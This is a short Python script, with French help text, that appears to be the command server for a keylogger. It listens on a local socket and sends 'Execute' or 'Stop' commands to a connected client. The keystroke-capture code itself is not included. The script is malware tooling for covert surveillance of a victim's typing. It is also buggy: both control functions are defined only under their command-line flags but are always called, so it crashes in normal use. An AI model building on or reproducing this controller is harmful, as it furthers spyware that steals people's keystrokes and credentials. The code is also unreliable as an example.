import socket as modSocket
import argparse

s = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)

s.bind(("localhost", 5000))

s.listen()
conn, addr = s.accept()

print ("Connexion avec l'adresse: ", addr)


        
parser = argparse.ArgumentParser()
parser.add_argument("--start", help="lance le keylloger", action="store_true")
parser.add_argument("--stop", help="stop le keylloger", action="store_true")
args = parser.parse_args()


if args.start:
    def start_log(conn):

        conn.send("Execute".encode("utf-8"))
        print(conn.recv(1024).decode("utf-8"))

if args.stop:
    def stop_log(conn):

        conn.send("Stop".encode("utf-8"))
        print(conn.recv(1024).decode("utf-8"))

    
    
start_log(conn)
stop_log(conn)
s.close()
